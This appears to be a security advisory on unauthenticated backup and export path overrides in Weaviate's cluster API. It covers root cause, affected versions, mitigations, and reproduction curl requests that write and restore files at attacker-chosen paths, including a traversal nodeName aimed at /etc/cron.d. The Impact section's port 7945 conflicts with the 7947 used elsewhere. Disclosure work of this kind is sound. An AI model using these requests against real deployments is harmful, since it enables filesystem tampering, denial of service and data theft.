# Weaviate Cluster API — Arbitrary Backup/Export Path Override (Unauthenticated)

---

## 1. Overview

| Field              | Value                                                        |
| ------------------ | ------------------------------------------------------------ |
| Affected product   | Weaviate (vector database, `semitechnologies/weaviate` container image) |
| Affected module    | `backup-filesystem` (via `ENABLE_MODULES`), `export`         |
| Affected interface | Cluster API, TCP 7947 (`/backups/*`, `/exports/*`)           |
| Affected versions  | **v1.28.0 and later** (confirmed through `1.40.0-rc.0`; master unpatched as of 2026-09-17). **v1.27.0 and earlier are not affected.** |
| Tested build       | `1.40.0-rc.0-6843ad7.amd64` (built 2026-09-16)               |
| Test date          | 2026-09-17                                                   |
| Test environment   | `192.168.49.128` — Ubuntu 24.04, Docker 29.1.3, single node, container process uid 0 |
| PoC artifact       | `poc_weaviate_backup_path.py` (write-side probe)             |

---

## 2. Executive Summary

The cluster-internal API binds `0.0.0.0:7947` (default). When
`CLUSTER_BASIC_AUTH_USERNAME` / `CLUSTER_BASIC_AUTH_PASSWORD` are not set, every
endpoint of this API answers **without authentication**.

Three request fields reach node-side filesystem operations without validation:

- `path` in `POST /backups/can-commit` (backup create / restore flow)
- `path` and `nodeName` in `POST /exports/prepare` (export flow)

The node performs `os.MkdirAll` and file creation/overwrite under the supplied
path. In the official container the process runs as root (uid 0).

Results:

1. Arbitrary directory trees and fixed-template files can be created or
   overwritten under any path the process can write (container filesystem).
2. File names are fixed by code templates: `backup.json`, `<class>/chunk-N`,
   `<class>_<shard>_NNNN.parquet`, `node_<nodeName>_status.json`.
3. Through the restore flow, fixed-layout backup files are read back into
   database objects and become readable via the REST API (also unauthenticated
   by default).
4. File names that do not match the templates (e.g. `authorized_keys`, web
   shells, cron files) cannot be created or overwritten. **No code execution
   was achieved.**
5. The REST API (port 8080, anonymous access enabled by default) provides full
   CRUD on the database and completes the read/exfil loop.

---

## 3. Preconditions

| Condition                          | Default                                                      | Check                                                        |
| ---------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `backup-filesystem` module enabled | `ENABLE_MODULES=backup-filesystem` present in many compose files | `GET /v1/meta` lists the module                              |
| Cluster basic auth disabled        | env unset                                                    | `BasicAuth.Enabled() == false` (`usecases/cluster/state.go`) |
| Cluster API reachable              | binds `:7947` on all interfaces                              | port scan                                                    |
| Anonymous REST access              | `AUTHENTICATION_ANONYMOUS_ACCESS_ENABLED` default true       | `GET /v1/schema` without credentials                         |

No version-specific precondition beyond the range in §4: the vulnerable code
path is present in master as of 2026-09-17; the attack was validated on
`1.40.0-rc.0-6843ad7.amd64`.

---

## 4. Affected Versions

Affected range: **v1.28.0 through the latest release** (master, as of
2026-09-17, unpatched). v1.28.0 introduced the `Path` override field
(`BackupRequest.Path`, honored without validation by the `backup-filesystem`
module); v1.27.0 and earlier are not affected because the request carries no
such field.

`CLUSTER_BASIC_AUTH_USERNAME` / `CLUSTER_BASIC_AUTH_PASSWORD` (available from
v1.28) close the unauthenticated exposure when set.

---

## 5. Root Cause

The caller-supplied `path` is forwarded verbatim to the filesystem store:

```go
// modules/backup-filesystem/backup.go:27
func (m *Module) resolvePath(overridePath string) (string, error) {
    p := m.backupsPath
    if overridePath != "" {
        p = overridePath
    }
    if p == "" {
        return "", fmt.Errorf("backup path must not be empty")
    }
    return p, nil
}

// usecases/backup/handler.go:277 (cluster API)
func (m *Handler) OnCanCommit(...) {
    store, err := nodeBackend(nodeName, m.backends, req.Backend, req.ID, req.Bucket, req.Path)
    ...
    err = store.Initialize(ctx, req.Bucket, req.Path)
}

// usecases/export/participant.go:257 (export Commit)
backendStore.Initialize(ctx, req.ID, req.Bucket, req.Path)
```

The cluster HTTP server wraps these routes in its authentication middleware;
when basic auth is not configured, the middleware passes all requests through
(`adapters/handlers/rest/clusterapi/serve.go`, `usecases/cluster/state.go`).

---

## 6. Attack Surface

Unauthenticated endpoints (`:7947`):

| Path                  | Method | Purpose                                    |
| --------------------- | ------ | ------------------------------------------ |
| `/backups/can-commit` | POST   | reserve slot, arm node-side backup/restore |
| `/backups/commit`     | POST   | trigger node-side write/restore            |
| `/backups/status`     | POST   | query state                                |
| `/backups/abort`      | POST   | cancel                                     |
| `/exports/prepare`    | POST   | reserve export slot                        |
| `/exports/commit?id=` | POST   | execute export                             |
| `/exports/status?id=` | GET    | poll                                       |
| `/exports/abort?id=`  | POST   | cancel                                     |

Writable artifact templates (fixed suffixes):

| Artifact        | Template                                         | Content                  |
| --------------- | ------------------------------------------------ | ------------------------ |
| backup metadata | `<path>/<backupID>/<node>/backup.json`           | server-generated JSON    |
| backup data     | `<path>/<backupID>/<node>/<class>/chunk-N`       | gzip tar of LSM segments |
| export data     | `<path>/<exportID>/<class>_<shard>_NNNN.parquet` | Parquet of objects       |
| export status   | `<path>/<exportID>/node_<nodeName>_status.json`  | JSON status              |

Name validation before use:

| Field      | Regular expression                                           | Effect                                                    |
| ---------- | ------------------------------------------------------------ | --------------------------------------------------------- |
| `backupId` | `^[a-z0-9_-]+$` (`usecases/backup/handler.go:135`)           | no `/`, `.`                                               |
| `class`    | `^[A-Z][_0-9A-Za-z]{0,254}$` (`entities/schema/validation.go:81`) | no `/`, `.`                                               |
| `shard`    | `[A-Za-z0-9\-_]{1,64}` (`entities/schema/validation.go:85`)  | no `/`, `.`                                               |
| `nodeName` | none                                                         | directory depth only; `..` normalized by `filepath.Clean` |

`nodeName` is embedded unsanitized in `node_<nodeName>_status.json`
(`usecases/export/participant.go:1091`). With `nodeName="../../etc/cron.d/evil"`
the writer lands at:

```
<path>/<exportID>/etc/cron.d/evil_status.json
```

`..` cannot escape the `<path>` baseline (normalized by `filepath.Clean`), but
intermediate directories at any depth can be created.

---

## 7. Reproduction

Environment: container with port mapping `7948:7947` (cluster API) and
`8082:8080` (REST). All requests carried no credentials.

### 7.1 Backup write

```bash
CLUSTER="http://192.168.49.128:7948"

curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","classes":[],
       "path":"/tmp/write"}'
# → 200 {"Method":"create","ID":"poc","Timeout":0,"Err":""}

curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'
# → 500 "commit: shard has abandon backup operation"
# (async race: an earlier aborted cycle was still finishing; the write that
#  actually ran completed, see status + file below)

curl -s -X POST "$CLUSTER/backups/status" -H 'Content-Type: application/json' \
  -d '{"method":"create","id":"poc","backend":"filesystem","path":"/tmp/write"}'
# → 200 {"Method":"create","ID":"poc","Status":"SUCCESS","Err":""}
```

Node side (`docker exec weaviate find /tmp/write -type f`):

```
/tmp/write/poc/<containerID>/backup.json
```

`backup.json` content (server-generated; attacker strings appear only inside
JSON-quoted fields):

```json
{"startedAt":"2026-09-17T09:46:32.901800905Z","completedAt":"0001-01-01T00:00:00Z",
 "id":"poc","classes":[],"rbacBackups":null,
 "userBackups":"eyJEYXRhIjo...","status":"SUCCESS","version":"2.1",
 "serverVersion":"1.40.0-rc.0","compressionType":"gzip"}
```

With classes present, the data files are written as gzip tar:

```
/tmp/chain/bvuln1/<containerID>/backup.json
/tmp/chain/bvuln1/<containerID>/EvilDoc/chunk-1
```

### 7.2 Backup restore (read-back)

```bash
curl -s -X POST "$CLUSTER/backups/can-commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","classes":["EvilDoc"],
       "path":"/tmp/victim"}'
curl -s -X POST "$CLUSTER/backups/commit" -H 'Content-Type: application/json' \
  -d '{"method":"restore","id":"poc","backend":"filesystem","path":"/tmp/victim"}'
```

After the status reaches SUCCESS, the object with property
`content: "PWNED-FILE-CONTENT"` is back in the database and is returned by
`GET /v1/objects?class=EvilDoc`.

Attempting `path=/etc` fails with:

```
restorer cannot validate: metadata not found: /etc/<id>/<node>/backup.json
```

Reads are limited to the fixed template under the chosen path.

### 7.3 Export write

```bash
curl -s -X POST "$CLUSTER/exports/prepare" -H 'Content-Type: application/json' \
  -d '{"id":"exp5","backend":"filesystem","classes":["EvilDoc"],
       "shards":{"EvilDoc":["<real-shard>"]},"path":"/tmp/exp_pwn"}'

curl -s -X POST "$CLUSTER/exports/commit?id=exp5" -H 'Content-Type: application/json'
```

Node side:

```
/tmp/exp_pwn/exp5/EvilDoc_<real-shard>_0000.parquet
/tmp/exp_pwn/exp5/node__status.json
```

With `nodeName="../../etc/cron.d/evil"` in the prepare body:

```
/tmp/exp_pwn/exp5/etc/cron.d/evil_status.json
```

---

## 8. Capability Matrix

| Capability                                                   | Requests                | Effect                                                       |
| ------------------------------------------------------------ | ----------------------- | ------------------------------------------------------------ |
| Create arbitrary directories                                 | 1 (export) / 2 (backup) | disk exhaustion, filesystem pollution                        |
| Write/overwrite `backup.json`, `chunk-N`, `*.parquet`, `node_*_status.json` | 1–3                     | backup tampering/unavailability; poisoning of any processor ingesting those paths |
| Read fixed-layout backup files                               | 2                       | backup content replayed into DB objects (REST-readable)      |
| Read backup metadata incl. `userBackups` snapshot (base64)   | 2                       | information exposure                                         |
| Full DB CRUD via anonymous REST                              | —                       | data theft / destruction / modification                      |

---

## 9. Impact

- Any host that can reach TCP 7945 can write into the container filesystem at
  any path the process can write, and rewrite or delete backup artifacts.
- Backup contents (schemas, vectors, objects) can be read, rewritten, or
  deleted; the restore flow stages attacker-chosen objects back into the
  database, served by the REST API.
- Cross-application contamination: other processes that read these roots
  (`node_*_status.json`, `*.parquet`, `backup.json`) ingest
  attacker-influenced content.
- Unbounded directory creation enables disk exhaustion (denial of service).

No evidence of remote code execution.

---

## 10. Mitigations

1. Set `CLUSTER_BASIC_AUTH_USERNAME` and `CLUSTER_BASIC_AUTH_PASSWORD`. When
   set, the cluster handlers enforce basic auth, closing the unauthenticated
   exposure.
2. Do not publish ports 7946–7948 outside the cluster network (private
   VPC/CNI segment only).
3. Disable anonymous REST access
   (`AUTHENTICATION_ANONYMOUS_ACCESS_ENABLED=false`) and enable API key or OIDC.
4. Upstream fix: validate that `path` / `nodeName` / `bucket` values stay
   under the configured `BACKUP_FILESYSTEM_PATH` (or reject overrides entirely).
5. Run the container as non-root (`USER 1000`), drop default privileges, mount
   a read-only root filesystem, avoid host bind-mounts.
6. Watch backup/export roots for file names outside the fixed templates.
